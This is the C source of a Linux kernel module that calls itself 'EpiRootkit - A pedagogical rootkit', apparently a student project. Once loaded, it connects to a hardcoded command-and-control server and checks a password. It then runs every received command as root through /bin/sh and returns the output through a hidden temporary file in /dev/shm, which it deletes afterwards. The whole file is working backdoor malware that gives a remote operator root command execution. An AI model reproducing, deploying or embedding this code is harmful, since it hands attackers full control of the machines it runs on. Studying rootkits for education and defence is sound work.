#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/kmod.h>
#include <linux/inet.h>
#include <net/sock.h>
#include <linux/list.h>
#include <linux/uio.h>
#include <linux/security.h>
#include <linux/namei.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
MODULE_VERSION("0.3");

static struct rootkit_config {
    unsigned short port;
    char server_ip[16];
    size_t buffer_size;
    char xor_key[32];
    char password[32];
} config = {
    .port = 4242,
    .server_ip = "192.168.15.6",
    .buffer_size = 2048,
    .xor_key = "epirootkit",
    .password = "epirookit"
};

static struct socket *g_sock = NULL;
static struct task_struct *g_conn_thread = NULL;
static struct task_struct *g_cmd_thread = NULL;
static int connection_state = 0;
static char working_directory[256] = "/";

static void notify_connection_state(int new_state) {
    if (new_state != connection_state) {
        connection_state = new_state;
        if (connection_state)
            printk(KERN_INFO "epirootkit: Connected to C2 server\n");
        else
            printk(KERN_INFO "epirootkit: Disconnected from C2 server\n");
    }
}

static int connect_to_c2_server(void) {
    struct sockaddr_in server;
    int err;

    err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_sock);
    if (err < 0)
        return err;

    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(config.port);
    server.sin_addr.s_addr = in_aton(config.server_ip);

    err = g_sock->ops->connect(g_sock, (struct sockaddr *)&server,
                               sizeof(server), O_NONBLOCK);
    if (err && err != -EINPROGRESS) {
        sock_release(g_sock);
        g_sock = NULL;
        return err;
    }

    pr_info("epirootkit: Connected to C2 server at %s:%d\n", config.server_ip, config.port);
    return 0;
}

static int send_to_c2(const char *msg, size_t len) {
    struct kvec iov;
    struct msghdr msg_hdr = {0};
    int sent;

    if (!g_sock)
        return -ENOTCONN;

    iov.iov_base = (char *)msg;
    iov.iov_len = len;

    sent = kernel_sendmsg(g_sock, &msg_hdr, &iov, 1, len);
    return sent;
}

static int command_loop(void *data) {
    char buffer[2048];
    struct kvec iov;
    struct msghdr msg_hdr = {0};
    int len, authenticated = 0;
    char full_cmd[2048];
    char *argv[4];
    char *envp[4];
    int ret;
    struct file *f;
    loff_t pos;
    ssize_t rlen;
    char outbuf[1024];
    const char *tmp_output_path = "/dev/shm/.rk";

    pr_info("epirootkit: command_loop started\n");

    while (!kthread_should_stop()) {
        memset(buffer, 0, sizeof(buffer));
        iov.iov_base = buffer;
        iov.iov_len = sizeof(buffer) - 1;

        len = kernel_recvmsg(g_sock, &msg_hdr, &iov, 1, sizeof(buffer) - 1, MSG_DONTWAIT);
        if (len <= 0) {
            msleep(500);
            continue;
        }

        buffer[len] = '\0';
        size_t input_len = strcspn(buffer, "\r\n");
        buffer[input_len] = '\0';

        if (!authenticated) {
            if (strcmp(buffer, config.password) == 0) {
                authenticated = 1;
                send_to_c2("AUTH OK\n", 8);
            } else {
                send_to_c2("AUTH FAIL\n", 10);
            }
            continue;
        }

        if (strncmp(buffer, "cd ", 3) == 0) {
            const char *path = buffer + 3;
            if (strlen(path) > 0 && strlen(path) < sizeof(working_directory)) {
                strncpy(working_directory, path, sizeof(working_directory) - 1);
                working_directory[sizeof(working_directory) - 1] = '\0';
            }
            send_to_c2("--EOF--\n", 8);
            continue;
        }

        if (strcmp(buffer, "exit") == 0) {
            send_to_c2("Shutting down\n--EOF--\n", 20);
            do_exit(0);
        }

        snprintf(full_cmd, sizeof(full_cmd), "cd %s && %s > %s 2>&1", working_directory, buffer, tmp_output_path);
        argv[0] = "/bin/sh";
        argv[1] = "-c";
        argv[2] = full_cmd;
        argv[3] = NULL;
        envp[0] = "HOME=/";
        envp[1] = "TERM=linux";
        envp[2] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
        envp[3] = NULL;

        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        if (ret)
            continue;

        f = filp_open(tmp_output_path, O_RDONLY, 0);
        if (!IS_ERR(f)) {
            pos = 0;
            do {
                memset(outbuf, 0, sizeof(outbuf));
                rlen = kernel_read(f, pos, outbuf, sizeof(outbuf) - 1);
                if (rlen > 0) {
                    send_to_c2(outbuf, rlen);
                    pos += rlen;
                }
            } while (rlen > 0);
            filp_close(f, NULL);

            struct path path;
            if (kern_path(tmp_output_path, 0, &path) == 0)
                vfs_unlink(path.dentry->d_parent->d_inode, path.dentry, NULL);
        }
        send_to_c2("--EOF--\n", 8);
    }
    return 0;
}

static int connection_loop(void *data) {
    while (!kthread_should_stop()) {
        if (g_sock) {
            msleep(3000);
            continue;
        }

        if (connect_to_c2_server() == 0) {
            notify_connection_state(1);
            if (!g_cmd_thread) {
                g_cmd_thread = kthread_run(command_loop, NULL, "rk_cmd");
                if (IS_ERR(g_cmd_thread)) {
                    g_cmd_thread = NULL;
                    sock_release(g_sock);
                    g_sock = NULL;
                    notify_connection_state(0);
                }
            }
        }
        msleep(3000);
    }
    return 0;
}

static int __init epirootkit_init(void) {
    pr_info("epirootkit: Initializing...\n");
    g_sock = NULL;
    g_cmd_thread = NULL;
    g_conn_thread = kthread_run(connection_loop, NULL, "rk_conn");
    if (IS_ERR(g_conn_thread)) {
        pr_err("epirootkit: Failed to start connection_loop\n");
        return PTR_ERR(g_conn_thread);
    }
    return 0;
}

static void __exit epirootkit_exit(void) {
    pr_info("epirootkit: Cleaning up module...\n");

    if (g_cmd_thread) {
        kthread_stop(g_cmd_thread);
        g_cmd_thread = NULL;
    }
    if (g_conn_thread) {
        kthread_stop(g_conn_thread);
        g_conn_thread = NULL;
    }
    if (g_sock) {
        sock_release(g_sock);
        g_sock = NULL;
        notify_connection_state(0);
    }
    pr_info("epirootkit: Cleanup complete\n");
}

module_init(epirootkit_init);
module_exit(epirootkit_exit);
